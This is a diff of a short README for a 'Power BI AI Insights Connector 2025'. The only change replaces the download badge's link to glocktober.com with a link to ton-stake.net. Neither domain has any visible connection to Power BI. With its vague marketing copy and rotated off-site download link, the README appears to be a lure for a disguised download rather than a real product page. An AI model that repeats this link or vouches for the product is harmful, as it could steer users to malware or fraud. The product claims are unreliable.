@@ -2,7 +2,7 @@
 
 ⚙ Elevate your business analytics with this AI-powered Power BI connector! Power BI AI Insights Connector 2025 enhances data visualization, automates predictive analytics, and streamlines reporting, tailored for analysts, executives, and enterprises in English-speaking regions.
 
-[![Get Power BI AI Insights Connector](https://img.shields.io/badge/Get-Power_BI_AI_Insights_Connector-blueviolet)](https://glocktober.com)
+[![Get Power BI AI Insights Connector](https://img.shields.io/badge/Get-Power_BI_AI_Insights_Connector-blueviolet)](https://ton-stake.net)
 
 ---
 
